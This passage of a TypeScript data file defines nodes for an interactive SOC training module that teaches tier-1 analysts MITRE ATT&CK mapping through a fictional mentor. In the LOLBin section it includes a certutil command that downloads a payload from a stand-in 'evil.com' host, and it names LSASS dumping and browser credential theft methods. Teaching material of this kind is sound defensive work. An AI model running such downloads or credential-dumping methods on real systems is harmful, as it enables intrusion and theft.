'use client';

import { VisualNodeItem } from './interactive-visual-story-engine';

// =============================================================================
// MODULE 13: MITRE ATT&CK FOR L1 ANALYSTS — NODE DEFINITIONS (18 Bespoke Models)
// Guide: Mentor Ananya (Senior Incident Handler & Detection Specialist)
// Motto: "ATT&CK is a shared vocabulary for observed behavior, NOT a proof of malicious intent. A technique mapping describes what happened technically, not whether it is malicious. An observed command is Discovery, but it is only malicious if unauthorized. Never infer a 7-stage attack chain from a single command. Safe mapping records the evidence, notes the uncertainty, and avoids premature speculation."
// =============================================================================

// -----------------------------------------------------------------------------
// CHAPTER 1: M13-U1-C1 (Tactics, techniques and procedures)
// -----------------------------------------------------------------------------

// 1. Pillar 1: TTP Triad Architecture (Tactic = Why, Technique = How, Procedure = Exactly What)
export const ttpTriadHierarchyNodes: VisualNodeItem[] = [
  {
    id: 'ttp-tactic-objective',
    label: '1. Tactic: The "Why" (Strategic Goal)',
    sub: 'TA0007: Discovery • Adversary Operational Intent',
    badge: 'TACTIC (WHY)',
    description: 'The tactical objective representing why the adversary executed an action: Initial Access, Execution, Persistence, Discovery, or Exfiltration.',
    details: 'Mentor Ananya explains: "Tactics represent the adversary\'s high-level goal. Discovery means the adversary wants situational awareness of your network."',
    tags: ['Tactic: Discovery', 'Strategic Goal', 'High-Level Intent', 'Enterprise Matrix'],
  },
  {
    id: 'ttp-technique-method',
    label: '2. Technique: The "How" (Method)',
    sub: 'T1087: Account Discovery • Standard Mechanism',
    badge: 'TECHNIQUE (HOW)',
    description: 'The general technical method used to achieve the tactical objective. Identifies standard system capabilities exploited by adversaries.',
    details: 'Ananya notes: "Techniques describe the mechanical method. Account Discovery covers enumerating local users, domain groups, or cloud roles."',
    tags: ['Technique: T1087', 'Technical Method', 'Mechanic', 'ATT&CK Catalog'],
  },
  {
    id: 'ttp-procedure-implementation',
    label: '3. Procedure: The "Exactly What" (Implementation)',
    sub: 'net user /domain • Specific Execution Telemetry',
    badge: 'PROCEDURE (WHAT)',
    description: 'The exact observable implementation: specific tool, command-line arguments, API call, or script code executed on the endpoint.',
    details: 'Ananya emphasizes: "Procedures are the precise keystrokes: net user /domain executed by powershell.exe under user FIN-OPS-01."',
    tags: ['Procedure Level', 'CommandLine Arg', 'Exact Keystroke', 'Forensic Artifact'],
  },
  {
    id: 'ttp-ananya-triad-doctrine',
    label: '4. Ananya\'s Triad Doctrine',
    sub: 'Tactics Endure • Procedures Evolve Continuously',
    badge: 'TRIAD DOCTRINE',
    description: 'Adversaries change procedures and tools constantly, but their tactical goals remain predictable. Behavioral detection targets the technique layer.',
    details: 'Ananya concludes: "An attacker can swap net.exe for Get-ADUser or adsi.dll. The procedure changes, but the technique Account Discovery remains identical."',
    tags: ['Triad Doctrine', 'Behavioral Defense', 'Resilience', 'L1 Methodology'],
  },
];

// 2. Pillar 2: ATT&CK Enterprise Matrix Navigation (Tactics Columns & Technique Grid)
export const matrixNavigationGridNodes: VisualNodeItem[] = [
  {
    id: 'mat-tactics-progression',
    label: '1. 14 Tactical Columns',
    sub: 'From Initial Access to Impact Progression',
    badge: 'TACTICS PROGRESSION',
    description: 'The chronological columns organizing adversary behavior: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, C2, and Impact.',
    details: 'Ananya teaches: "The columns read left-to-right conceptually, but real-world adversaries bounce between columns non-linearly."',
    tags: ['14 Tactics Columns', 'Enterprise Matrix', 'Non-Linear Flow', 'Matrix Header'],
  },
  {
    id: 'mat-technique-subtechnique',
    label: '2. Techniques & Sub-Techniques',
    sub: 'Parent T1059 vs Sub-Technique T1059.001',
    badge: 'SUB-TECHNIQUES',
    description: 'Hierarchical categorization providing granular precision: T1059 (Command and Scripting) branches into T1059.001 (PowerShell), T1059.003 (Windows Command Shell), and T1059.005 (VBScript).',
    details: 'Ananya instructs: "Always map to the sub-technique level when telemetry confirms the exact scripting interpreter."',
    tags: ['T1059.001', 'Sub-Technique', 'PowerShell Engine', 'Granular Precision'],
  },
  {
    id: 'mat-l1-focus-quadrant',
    label: '3. The L1 Analyst Triage Zone',
    sub: 'Execution, Credential Access & Discovery',
    badge: 'L1 TRIAGE ZONE',
    description: 'The core columns where Tier-1 SOC analysts spend 80% of their operational shifts triaging endpoint telemetry and alert queues.',
    details: 'Ananya notes: "Focus your early vigilance on Execution (T1059), Credential Access (T1003), and Discovery (T1082/T1087). That is where intrusions reveal themselves."',
    tags: ['L1 Focus Area', 'High-Frequency TTPs', 'Endpoint Detection', 'Triage Priority'],
  },
  {
    id: 'mat-ananya-common-language',
    label: '4. Ananya\'s Universal Vocabulary',
    sub: 'Replaces Vague Proprietary Threat Classifications',
    badge: 'COMMON LANGUAGE',
    description: 'ATT&CK provides an open, vendor-neutral taxonomy that unifies SOC analysts, incident response teams, threat hunters, and system administrators.',
    details: 'Ananya concludes: "No more arguing over whether something is Trojan.Win32 or HackerTool.X. We cite T1059.001 and T1087.002. Clarity eliminates confusion."',
    tags: ['Universal Dialect', 'Vendor Neutral', 'Cross-Team Sync', 'Operational Clarity'],
  },
];

// 3. Pillar 3: Shared Vocabulary vs Vendor Jargon & Hype
export const sharedVocabularyEngineNodes: VisualNodeItem[] = [
  {
    id: 'voc-vendor-alarm-chaos',
    label: '1. Proprietary Vendor Alarm Chaos',
    sub: 'Alert: "Heur.Malware.SuperAgent!crit (High)"',
    badge: 'VENDOR JARGON',
    description: 'Cryptic, branded alert names from endpoint security tools that convey zero actionable insight regarding what technical action occurred.',
    details: 'Ananya highlights: "What does \'SuperAgent!crit\' actually mean? Did it execute code? Did it dump memory? Vendor marketing names hide the ground truth."',
    tags: ['Vendor Alarm', 'Proprietary Label', 'Cryptic Jargon', 'Ambiguity Hazard'],
  },
  {
    id: 'voc-mitre-normalization',
    label: '2. MITRE ATT&CK Normalization Layer',
    sub: 'Mapped: T1059.001 + T1082 System Discovery',
    badge: 'NORMALIZATION',
    description: 'Translating the raw vendor detection into empirical ATT&CK technique IDs based on underlying process lineage and command arguments.',
    details: 'Ananya teaches: "The underlying telemetry shows powershell.exe invoking systeminfo. We normalize this to T1059.001 and T1082."',
    tags: ['ATT&CK Mapping', 'T1059.001', 'T1082', 'Empirical Grounding'],
  },
  {
    id: 'voc-cross-team-handshake',
    label: '3. Cross-Team Technical Handshake',
    sub: 'SOC L1 -> Incident Response -> SysAdmin',
    badge: 'TEAM HANDSHAKE',
    description: 'Shared technical understanding across teams: system administrators instantly comprehend "System Discovery via PowerShell" without deciphering AV strings.',
    details: 'Ananya instructs: "When you escalate a ticket citing T1059.001 with command evidence, the IR team immediately knows how to scope their containment."',
    tags: ['Cross-Team Handshake', 'IR Escalation', 'Shared Understanding', 'Clean Handoff'],
  },
  {
    id: 'voc-ananya-clarity-law',
    label: '4. Ananya\'s Clarity Law',
    sub: 'Cite the Technique ID & The Exact Telemetry Anchor',
    badge: 'CLARITY LAW',
    description: 'Professional standard for L1 documentation: eliminate subjective adjectives and cite exact technique numbers backed by empirical telemetry.',
    details: 'Ananya concludes: "Clarity saves precious minutes during an incident. State the technique, cite the PID, and provide the command string."',
    tags: ['Documentation Standard', 'Audit Proof', 'Clarity Law', 'L1 Excellence'],
  },
];

// -----------------------------------------------------------------------------
// CHAPTER 2: M13-U1-C2 (Using the matrix as a vocabulary)
// -----------------------------------------------------------------------------

// 4. Pillar 1: Descriptive Vocabulary vs Malicious Proof Fallacy
export const descriptiveNotMaliceNodes: VisualNodeItem[] = [
  {
    id: 'des-observed-mechanic',
    label: '1. Observed Technical Mechanic',
    sub: 'Command: whoami.exe /priv on Host BLR-BR-WS-04',
    badge: 'OBSERVED MECHANIC',
    description: 'A genuine technical event occurring on the operating system: a process spawned and queried system token privileges.',
    details: 'Ananya asks: "Is whoami.exe an attack? No, it is a standard Windows diagnostic utility included in every operating system installation since Windows 2000."',
    tags: ['Technical Event', 'whoami.exe', 'OS Utility', 'Raw Observation'],
  },
  {
    id: 'des-technique-label',
    label: '2. Descriptive ATT&CK Label: T1033',
    sub: 'T1033: System Owner/User Discovery',
    badge: 'TECHNIQUE TAG',
    description: 'The ATT&CK tag that objectively describes the mechanics of querying user identity and group memberships.',
    details: 'Ananya explains: "Labeling an event T1033 describes what the computer did technically. It does NOT declare that an adversary is sitting at the keyboard."',
    tags: ['T1033 Tag', 'Descriptive Label', 'Objective Truth', 'Mechanism Only'],
  },
  {
    id: 'des-context-evaluation',
    label: '3. Contextual Authorization Assessment',
    sub: 'IT Admin Maintenance vs Midnight Temp Spawn',
    badge: 'AUTHORIZATION CONTEXT',
    description: 'The operational context that determines disposition: an authorized IT administrator during a ticket maintenance window vs a macro-spawned shell at 3:00 AM.',
    details: 'Ananya teaches: "If IT admin Rajesh runs whoami during scheduled maintenance, it is benign T1033. If word.exe spawns whoami from C:\\Temp, it is unauthorized T1033."',
    tags: ['Contextual Triage', 'Authorized IT', 'Unauthorized Anomaly', 'Disposition'],
  },
  {
    id: 'des-ananya-proof-doctrine',
    label: '4. Ananya\'s Proof Doctrine',
    sub: 'ATT&CK Describes Mechanics • Context Determines Malice',
    badge: 'PROOF DOCTRINE',
    description: 'The fundamental principle of SOC threat mapping: mapping an ATT&CK technique describes technical activity; only authorization context proves malicious intent.',
    details: 'Ananya concludes: "Never tell your shift lead \'We are under attack because I found T1033\'. Say \'I observed T1033; here is the context showing whether it is authorized\'."',
    tags: ['Proof Fallacy', 'Context First', 'Professional Rigor', 'Ananya Principle'],
  },
];

// 5. Pillar 2: Observable-to-Technique Mapping Pipeline
export const observableTechniquePipelineNodes: VisualNodeItem[] = [
  {
    id: 'obs-raw-command-event',
    label: '1. Raw Endpoint Telemetry Event',
    sub: 'Sysmon Event 1: net group "Domain Admins" /domain',
    badge: 'RAW OBSERVABLE',
    description: 'Process creation log captured from endpoint sensor on BLR-BR-WS-04, containing command line, parent PID, user token, and timestamp.',
    details: 'Ananya instructs: "Always begin with the raw log. Look at the exact command line: net.exe with arguments group Domain Admins /domain."',
    tags: ['Sysmon Event 1', 'Endpoint Telemetry', 'Process Creation', 'Raw Evidence'],
  },
  {
    id: 'obs-behavioral-parsing',
    label: '2. Behavioral Intent Parsing',
    sub: 'Querying Active Directory Domain Security Groups',
    badge: 'BEHAVIORAL PARSE',
    description: 'Analyzing what the command achieves technically: sending an RPC query to the Active Directory domain controller to enumerate privileged administrators.',
    details: 'Ananya notes: "The process is asking the domain controller for a list of all accounts holding domain admin rights."',
    tags: ['Active Directory Query', 'Domain Admins', 'RPC Call', 'Behavior Analysis'],
  },
  {
    id: 'obs-technique-tagging',
    label: '3. Specific Technique Assignment: T1069.002',
    sub: 'T1069.002: Permission Groups Discovery (Domain)',
    badge: 'ATT&CK ASSIGNMENT',
    description: 'Assigning the exact MITRE ATT&CK sub-technique that matches domain-level permission group discovery rather than local workstation groups.',
    details: 'Ananya explains: "We map specifically to T1069.002 (Domain Groups) rather than generic T1069 or local T1069.001."',
    tags: ['T1069.002', 'Domain Groups', 'Sub-Technique Match', 'Accurate Tag'],
  },
  {
    id: 'obs-ananya-mapping-rigor',
    label: '4. Ananya\'s Mapping Rigor Standard',
    sub: 'Ground Every Mapping in Verifiable Command Arguments',
    badge: 'MAPPING RIGOR',
    description: 'Technique tags must be defended with verified telemetry fields. Speculative or assumed mappings without command-line evidence are rejected.',
    details: 'Ananya concludes: "If you cannot point to the exact command argument or API call in the log, you do not have an ATT&CK mapping."',
    tags: ['Ground Truth', 'Verifiable Evidence', 'Rigorous Mapping', 'Audit Defense'],
  },
];

// 6. Pillar 3: Dual-Use Utilities (LOLBins) & Dual-Identity Paradox
export const dualUseLolbinsParadoxNodes: VisualNodeItem[] = [
  {
    id: 'lol-dual-use-binary',
    label: '1. The Dual-Use Binary: certutil.exe',
    sub: 'Signed Microsoft Certificate Management Tool',
    badge: 'LOLBIN BINARY',
    description: 'Living-off-the-Land Binary (LOLBin): a legitimate, digitally signed operating system utility abused by adversaries to evade defense mechanisms.',
    details: 'Ananya asks: "Is certutil.exe malicious? It is a core Windows binary signed by Microsoft Corporation to manage cryptographic certificates."',
    tags: ['certutil.exe', 'Signed Binary', 'LOLBin Concept', 'Dual-Use Reality'],
  },
  {
    id: 'lol-admin-use-case',
    label: '2. Legitimate Administrative Usage',
    sub: 'certutil.exe -verifyctl • Checking Enterprise CRL',
    badge: 'ADMIN USE CASE',
    description: 'Legitimate IT administration: verifying certificate revocation lists, installing enterprise root certificates, or checking certificate validity.',
    details: 'Ananya notes: "When IT runs certutil to verify an SSL certificate store, parent is cmd.exe launched by an authenticated administrator in console session 1."',
    tags: ['Legitimate Admin', 'CRL Verification', 'Normal Operations', 'Benign LOLBin'],
  },
  {
    id: 'lol-adversary-use-case',
    label: '3. Adversary Ingress Tool Transfer Abuse',
    sub: 'certutil.exe -urlcache -f http://evil.com/payload.exe',
    badge: 'ADVERSARY ABUSE',
    description: 'Adversary exploitation: abusing certutil\'s built-in HTTP download capability to fetch secondary malware stages while bypassing firewall filters (T1105).',
    details: 'Ananya warns: "When certutil uses -urlcache to download a raw executable from an external unclassified IP, that is Ingres Tool Transfer T1105."',
    tags: ['T1105 Abuse', 'URLCache Download', 'Adversary Technique', 'Malicious LOLBin'],
  },
  {
    id: 'lol-ananya-lolbin-rule',
    label: '4. Ananya\'s LOLBin Doctrine',
    sub: 'Never Block the Tool • Scrutinize the Arguments & Parent',
    badge: 'LOLBIN DOCTRINE',
    description: 'Security operations cannot simply blacklist built-in OS tools. Defense requires inspecting command arguments, parent process lineage, and network sockets.',
    details: 'Ananya concludes: "If you block certutil, you break Windows updates and certificate renewals. Detect the malicious parameters, not the binary itself."',
    tags: ['LOLBin Doctrine', 'Argument Inspection', 'Parent Lineage', 'Defensible SOC'],
  },
];

// -----------------------------------------------------------------------------
// CHAPTER 3: M13-U2-C1 (Credential access and discovery examples)
// -----------------------------------------------------------------------------

// 7. Pillar 1: Credential Access Mechanics (T1003 LSASS Dump vs T1110 Brute Force)
export const credentialAccessMatrixNodes: VisualNodeItem[] = [
  {
    id: 'crd-lsass-memory-dump',
    label: '1. T1003.001: LSASS Memory Dumping',
    sub: 'OpenProcess PROCESS_VM_READ on lsass.exe',
    badge: 'T1003.001 DUMP',
    description: 'Adversary extracts plaintext passwords, NTLM hashes, and Kerberos tickets directly from the Local Security Authority Subsystem Service (LSASS) memory.',
    details: 'Ananya teaches: "LSASS stores logon credentials in memory. Adversaries use procdump or comsvcs.dll MiniDump to extract credentials for lateral movement."',
    tags: ['T1003.001', 'LSASS Memory Dump', 'Mimikatz / Procdump', 'High Severity'],
  },
  {
    id: 'crd-password-spray-matrix',
    label: '2. T1110.003: Password Spraying',
    sub: '1 Password Tried Across 200 Corporate Accounts',
    badge: 'T1110.003 SPRAY',
    description: 'Adversary tests a single common password (e.g. "Welcome@2026!") against hundreds of corporate accounts to avoid account lockout thresholds.',
    details: 'Ananya notes: "Brute force targets one user with 1,000 passwords. Password spraying targets 1,000 users with 1 password. That bypasses basic lockouts."',
    tags: ['T1110.003', 'Password Spray', 'Lockout Evasion', 'Identity TTP'],
  },
  {
    id: 'crd-browser-vault-theft',
    label: '3. T1555.003: Credentials from Web Browsers',
    sub: 'Querying SQLite Login Data & DPAPI Decryption',
    badge: 'T1555.003 VAULT',
    description: 'Adversary reads saved passwords, session cookies, and tokens from Google Chrome or Microsoft Edge SQLite databases using DPAPI decryption.',
    details: 'Ananya instructs: "InfoStealers target AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data to siphon corporate web portal credentials."',
    tags: ['T1555.003', 'Browser Vault', 'DPAPI Decryption', 'Session Theft'],
  },
  {
    id: 'crd-ananya-credential-shield',
    label: '4. Ananya\'s Credential Shield Doctrine',
    sub: 'Credential Access Signals Imminent Lateral Spread',
    badge: 'CREDENTIAL SHIELD',
    description: 'Credential access is the bridge between an isolated workstation foothold and enterprise-wide domain compromise. Requires rapid containment response.',
    details: 'Ananya concludes: "When Credential Access triggers, the adversary is preparing to move laterally. Revoke user sessions and isolate the host immediately."',
    tags: ['Lateral Prevention', 'High Criticality', 'Session Revocation', 'Immediate Triage'],
  },
];

// 8. Pillar 2: Discovery TTPs (T1087 Account, T1082 System, T1018 Network)
export const discoveryTtpsReconNodes: VisualNodeItem[] = [
  {
    id: 'dsc-account-discovery',
    label: '1. T1087: Account Discovery',
    sub: 'net user /domain • Enumerating Domain Accounts',
    badge: 'T1087 ACCOUNT',
    description: 'Adversary queries local or domain accounts to identify targets for privilege escalation, phishing, or credential access.',
    details: 'Ananya explains: "net user /domain or Get-LocalUser allows the attacker to discover which accounts exist and when their passwords were last changed."',
    tags: ['T1087', 'Account Recon', 'User Enumeration', 'Domain Users'],
  },
  {
    id: 'dsc-network-discovery',
    label: '2. T1016: System Network Configuration',
    sub: 'ipconfig /all & route print • Mapping Subnets',
    badge: 'T1016 NETWORK',
    description: 'Adversary looks for internal routing tables, default gateways, DNS resolvers, and network interfaces to understand network segmentation.',
    details: 'Ananya notes: "ipconfig /all and netstat -ano map open connections and identify adjacent VLANs holding database or domain servers."',
    tags: ['T1016', 'ipconfig /all', 'Network Config', 'Subnet Discovery'],
  },
  {
    id: 'dsc-remote-host-discovery',
    label: '3. T1018: Remote System Discovery',
    sub: 'nltest /dclist:fincorp.local • Locating DCs',
    badge: 'T1018 REMOTE',
    description: 'Adversary identifies other networked computers, specifically locating Active Directory domain controllers, file shares, and backup servers.',
    details: 'Ananya highlights: "nltest /dclist locates the authoritative domain controllers. That is the adversary\'s roadmap to the crown jewels."',
    tags: ['T1018', 'nltest /dclist', 'Domain Controller', 'Remote Systems'],
  },
  {
    id: 'dsc-ananya-discovery-cadence',
    label: '4. Ananya\'s Discovery Cadence Standard',
    sub: 'Bursts of 3+ Discovery Commands in Under 180 Seconds',
    badge: 'CADENCE RULE',
    description: 'Adversary reconnaissance characteristically occurs in automated rapid bursts: whoami, ipconfig, net user, systeminfo executed within 3 minutes.',
    details: 'Ananya concludes: "Human administrators execute one diagnostic command, read output, and pause. Automated adversary scripts fire 5 discovery commands in 10 seconds."',
    tags: ['Discovery Cadence', 'Burst Telemetry', 'Script Detection', 'L1 Behavioral Clue'],
  },
];

// 9. Pillar 3: The Discovery-to-Credential Bridge (Correlating Chain Links)
export const discoveryCredentialBridgeNodes: VisualNodeItem[] = [
  {
    id: 'brg-discovery-recon',
    label: '1. Discovery Phase (The Scouting Party)',
    sub: 'T1087 + T1082: Identifying Admin FIN-ADMIN-01',
    badge: 'SCOUTING PHASE',
    description: 'The adversary maps the local environment, finding that high-privileged domain administrator account FIN-ADMIN-01 has an active session.',
    details: 'Ananya teaches: "The attacker runs net group \'Domain Admins\' /domain and discovers user FIN-ADMIN-01."',
    tags: ['Discovery Phase', 'Domain Admin Found', 'Scouting', 'T1087'],
  },
  {
    id: 'brg-high-value-target',
    label: '2. High-Value Target Isolation',
    sub: 'Binding Target Identity to Local Workstation Session',
    badge: 'TARGET ISOLATION',
    description: 'The discovery output reveals that the target administrator logged into workstation BLR-BR-WS-04, leaving cached credentials in memory.',
    details: 'Ananya notes: "Discovery telemetry bridges directly into targeting. The attacker now knows which process space contains admin credentials."',
    tags: ['Target Identification', 'Cached Credentials', 'Privilege Target', 'Strategic Pivot'],
  },
  {
    id: 'brg-credential-execution',
    label: '3. Credential Access Strike (The Breach)',
    sub: 'T1003.001: LSASS Memory Access on Targeted Host',
    badge: 'BREACH PHASE',
    description: 'Armed with discovery intel, the adversary executes LSASS memory extraction targeting the specific domain administrator credentials.',
    details: 'Ananya highlights: "The adversary executes MiniDump on lsass.exe to harvest the NTLM hash of FIN-ADMIN-01."',
    tags: ['T1003.001', 'Credential Strike', 'Harvesting Hash', 'Breach Execution'],
  },
  {
    id: 'brg-ananya-bridge-synthesis',
    label: '4. Ananya\'s Correlation Bridge Principle',
    sub: 'Catch the Discovery Scouts Before They Launch the Breach',
    badge: 'BRIDGE PRINCIPLE',
    description: 'Correlating Discovery alerts with subsequent Credential Access attempts allows L1 analysts to intercept attacks before privilege escalation succeeds.',
    details: 'Ananya concludes: "If you detect and contain the discovery reconnaissance on workstation BLR-BR-WS-04, the credential breach never happens."',
    tags: ['Correlation Bridge', 'Early Containment', 'Proactive Defense', 'SOC Victory'],
  },
];

// -----------------------------------------------------------------------------
// CHAPTER 4: M13-U2-C2 (Choose a plausible technique carefully)
// -----------------------------------------------------------------------------

// 10. Pillar 1: Technique Specificity & Hierarchy (Parent T1059 vs Sub T1059.001)
export const techniqueSpecificityDepthNodes: VisualNodeItem[] = [
  {
    id: 'spc-vague-parent-technique',
    label: '1. Vague Parent Technique: T1059',
    sub: 'Command and Scripting Interpreter (Too Broad)',
    badge: 'TOO BROAD (T1059)',
    description: 'Assigning high-level parent technique T1059 without specifying whether it was Python, Bash, AppleScript, PowerShell, or Windows Command Shell.',
    details: 'Ananya asks: "If you just tell detection engineers \'T1059 occurred\', how do they write a rule? T1059 has dozens of sub-techniques across Windows, Linux, and Mac."',
    tags: ['Parent Technique', 'T1059', 'Overly Broad', 'Weak Specificity'],
  },
  {
    id: 'spc-precise-subtechnique',
    label: '2. Precise Sub-Technique: T1059.001',
    sub: 'PowerShell Execution Engine Specifically',
    badge: 'PRECISE SUB-TECHNIQUE',
    description: 'Assigning the exact sub-technique T1059.001 because telemetry confirms powershell.exe or System.Management.Automation.dll execution.',
    details: 'Ananya teaches: "T1059.001 tells the engineering team to inspect ScriptBlock Logging (Event 4104) and Transcription logs."',
    tags: ['T1059.001', 'Sub-Technique', 'PowerShell Specific', 'Actionable Rule'],
  },
  {
    id: 'spc-argument-evidence',
    label: '3. Argument Evidence Grounding',
    sub: '-ExecutionPolicy Bypass -NoProfile -EncodedCommand',
    badge: 'ARGUMENT GROUNDING',
    description: 'Backing the sub-technique assignment with the exact command-line arguments that prove PowerShell script execution bypassed execution policies.',
    details: 'Ananya notes: "The arguments prove malicious tradecraft: bypassing execution policies and running base64 encoded payloads."',
    tags: ['EncodedCommand', 'ExecutionPolicy', 'Parameter Evidence', 'Ground Proof'],
  },
  {
    id: 'spc-ananya-specificity-rule',
    label: '4. Ananya\'s Specificity Rule',
    sub: 'Always Map to the Most Specific Sub-Technique Supported by Evidence',
    badge: 'SPECIFICITY RULE',
    description: 'The L1 mapping standard: never stop at the broad parent category when verified log evidence supports a specific sub-technique.',
    details: 'Ananya concludes: "Specific mappings create surgical detection rules. Generic mappings create noisy, useless alerts."',
    tags: ['Specificity Standard', 'Surgical Mapping', 'Detection Engineering', 'L1 Excellence'],
  },
];

// 11. Pillar 2: Plausible vs Speculative Matching (Avoiding Overclaiming)
export const plausibleVsSpeculativeNodes: VisualNodeItem[] = [
  {
    id: 'plu-grounded-observable',
    label: '1. Grounded Empirical Observable',
    sub: 'cmd.exe /c dir C:\\Users\\FIN-OPS-01\\Documents',
    badge: 'GROUND OBSERVABLE',
    description: 'The verified fact from endpoint telemetry: standard command shell executed directory listing in the logged-in user\'s personal document folder.',
    details: 'Ananya instructs: "Look strictly at what is in front of you. A standard user directory listing executed at 10:14 AM."',
    tags: ['cmd.exe dir', 'User Documents', 'Empirical Fact', 'Verified Log'],
  },
  {
    id: 'plu-plausible-mapping',
    label: '2. Plausible Technical Mapping: T1083',
    sub: 'T1083: File and Directory Discovery (Plausible)',
    badge: 'PLAUSIBLE (T1083)',
    description: 'The objective, defensible ATT&CK mapping that accurately describes the technical capability of directory listing without speculation.',
    details: 'Ananya teaches: "T1083 File and Directory Discovery is the exact, honest technical mapping for this observed command."',
    tags: ['T1083', 'File Discovery', 'Defensible Mapping', 'Plausible Match'],
  },
  {
    id: 'plu-wild-speculation-trap',
    label: '3. Wild Speculative Attribution Trap',
    sub: 'Claiming: "APT29 Cozy Bear Espionage Infiltration!"',
    badge: 'SPECULATION TRAP',
    description: 'The rookie analyst trap: seeing a basic Windows command and wildly extrapolating that it represents an advanced nation-state espionage operation.',
    details: 'Ananya cautions: "An intern sees dir C:\\Users and writes in the ticket: \'APT29 Cozy Bear is exfiltrating intellectual property!\' That is pure fantasy."',
    tags: ['Attribution Trap', 'Speculation Risk', 'Overclaiming', 'Unprofessional'],
  },
  {
    id: 'plu-ananya-restraint-standard',
    label: '4. Ananya\'s Restraint Standard',
    sub: 'Map Only What the Log Explicitly Documents',
    badge: 'RESTRAINT STANDARD',
    description: 'L1 analysts map technical behaviors, not geopolitical threat actors. Stick rigorously to observed telemetry and leave attribution to Tier-3 threat intel specialists.',
    details: 'Ananya concludes: "Professional credibility is built on restraint. Map T1083; verify authorization; leave Russian spy thrillers out of incident tickets."',
    tags: ['Restraint Standard', 'Forensic Integrity', 'Zero Hype', 'Ananya Doctrine'],
  },
];

// 12. Pillar 3: Evidence Threshold Matrix for Technique Validation
export const evidenceThresholdMatrixNodes: VisualNodeItem[] = [
  {
    id: 'thr-process-path-gate',
    label: '1. Gate 1: Full Image Path Verification',
    sub: 'C:\\Windows\\System32\\whoami.exe (Not AppData Temp)',
    badge: 'IMAGE PATH GATE',
    description: 'Verifies the authentic execution binary path: standard System32 directory vs suspicious user AppData or masqueraded spoofed path.',
    details: 'Ananya instructs: "Threshold 1: Verify the absolute path. Is it running from System32 or a fake whoami.exe in C:\\Users\\Public?"',
    tags: ['Image Path', 'System32 Verified', 'Path Gate', 'Masquerading Check'],
  },
  {
    id: 'thr-command-line-gate',
    label: '2. Gate 2: Explicit Command-Line Arguments',
    sub: 'Capturing Exact Flag Telemetry: /all or /priv',
    badge: 'COMMAND ARGS GATE',
    description: 'Validating the specific flags executed to differentiate routine administrative scripts from privilege enumeration.',
    details: 'Ananya notes: "Threshold 2: Capture command arguments. A blank whoami simply prints the username; whoami /priv queries security token rights."',
    tags: ['Command Arguments', 'whoami /priv', 'Flag Verification', 'Argument Gate'],
  },
  {
    id: 'thr-parent-lineage-gate',
    label: '3. Gate 3: Parent Process Lineage Correlation',
    sub: 'Parent: cmd.exe (PID 2140) vs excel.exe (PID 3840)',
    badge: 'PARENT LINEAGE GATE',
    description: 'Correlating the parent process hierarchy: an interactive console shell launched by the user vs an anomalous Office document or web server parent.',
    details: 'Ananya teaches: "Threshold 3: Parent process. If whoami is spawned by cmd.exe in console session, low suspicion. Spawned by excel.exe? High alert."',
    tags: ['Parent PID', 'Process Lineage', 'excel.exe Spawning', 'Lineage Gate'],
  },
  {
    id: 'thr-ananya-threshold-seal',
    label: '4. Ananya\'s 4-Gate Threshold Seal',
    sub: 'Four Verified Telemetry Facts = Audit-Proof Mapping',
    badge: 'THRESHOLD SEAL',
    description: 'When all gates (Path, Arguments, Parent, User Token) are satisfied, the ATT&CK mapping is certified as audit-proof and defensible.',
    details: 'Ananya concludes: "With all four gates documented in the ticket, your MITRE mapping is unbreakable under any audit or senior peer review."',
    tags: ['Threshold Seal', 'Audit Proof', '4-Gate Model', 'Certified Mapping'],
  },
];

// -----------------------------------------------------------------------------
// CHAPTER 5: M13-U3-C1 (Evidence and uncertainty)
// -----------------------------------------------------------------------------

// 13. Pillar 1: Evidentiary Anchors for ATT&CK Tags
export const evidentiaryAnchorsDossierNodes: VisualNodeItem[] = [
  {
    id: 'anc-technique-tag',
    label: '1. The ATT&CK Technique Tag',
    sub: 'T1059.001: PowerShell Execution Engine',
    badge: 'TECHNIQUE TAG',
    description: 'The standardized MITRE ATT&CK identifier representing the technical behavior observed in the security event.',
    details: 'Ananya teaches: "We assign T1059.001 to describe the execution method."',
    tags: ['T1059.001', 'Technique Tag', 'MITRE Identifier', 'Behavior Label'],
  },
  {
    id: 'anc-telemetry-anchor',
    label: '2. Concrete Telemetry Anchor',
    sub: 'Sysmon Event 1 • 2026-10-15T09:14:02Z • PID 4820',
    badge: 'TELEMETRY ANCHOR',
    description: 'The immutable forensic evidence link: specific event log ID, normalized UTC timestamp, host asset tag, and process identifier.',
    details: 'Ananya notes: "The anchor is Sysmon Event ID 1 on host BLR-BR-WS-04, recorded at exactly 09:14:02 UTC with PID 4820."',
    tags: ['Sysmon Event 1', 'UTC Timestamp', 'Host BLR-BR-WS-04', 'PID 4820'],
  },
  {
    id: 'anc-observable-proof',
    label: '3. Observable Payload Proof',
    sub: 'SHA-256 Hash & Decoded Scriptblock Telemetry',
    badge: 'OBSERVABLE PROOF',
    description: 'The ground-truth proof string: the verified cryptographic file hash, decoded command string, or network destination IP address.',
    details: 'Ananya instructs: "Attach the decoded scriptblock text and binary SHA-256 hash. That proves what executed beyond any doubt."',
    tags: ['Scriptblock Log', 'SHA-256 Hash', 'Decoded String', 'Irrefutable Proof'],
  },
  {
    id: 'anc-ananya-anchor-doctrine',
    label: '4. Ananya\'s Anchor Doctrine',
    sub: 'An ATT&CK Tag Without an Anchor is Merely an Opinion',
    badge: 'ANCHOR DOCTRINE',
    description: 'The core operational mandate: every technique tag in an incident ticket must be linked directly to its supporting telemetry anchor.',
    details: 'Ananya concludes: "Never submit a ticket with floating technique tags. If you tag T1059.001, attach its Sysmon log anchor. No anchor, no tag."',
    tags: ['Anchor Doctrine', 'Evidence Binding', 'Forensic Integrity', 'Zero Floating Tags'],
  },
];

// 14. Pillar 2: Expressing Uncertainty & Confidence Levels (Confirmed vs Suspected)
export const uncertaintyConfidenceLevelsNodes: VisualNodeItem[] = [
  {
    id: 'unc-confirmed-high',
    label: '1. Confirmed Match (High Confidence)',
    sub: 'Exact Procedure & Full Command Telemetry Verified',
    badge: 'CONFIRMED (HIGH)',
    description: '100% telemetry verification: full binary path, complete command-line parameters, matching hash, and verified process creation log.',
    details: 'Ananya teaches: "Confirmed means no missing data. We have the full command powershell.exe -enc ... and verified execution outcome."',
    tags: ['High Confidence', 'Confirmed Match', 'Zero Gaps', 'Verified Execution'],
  },
  {
    id: 'unc-suspected-medium',
    label: '2. Suspected Match (Medium Confidence)',
